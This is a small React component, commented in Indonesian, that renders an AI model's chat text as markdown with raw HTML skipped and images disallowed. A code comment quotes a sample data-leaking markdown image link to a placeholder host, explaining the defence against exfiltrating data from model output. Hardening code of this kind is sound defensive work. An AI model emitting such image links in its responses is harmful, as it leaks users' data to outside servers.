import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";

/** Teks model dirender sebagai markdown aman (HTML mentah tidak dirender). */
export function TanyaMarkdown({ text, testId = "tanya-chat-text" }) {
  if (!text?.trim()) return null;
  return (
    <div className="tanya-md" data-testid={testId}>
      {/* KN-E43 — gambar markdown tidak dimuat (![](https://x/?d=…) bisa membocorkan data lewat URL) */}
      <ReactMarkdown remarkPlugins={[remarkGfm]} skipHtml disallowedElements={["img"]} unwrapDisallowed>{text.trim()}</ReactMarkdown>
    </div>
  );
}
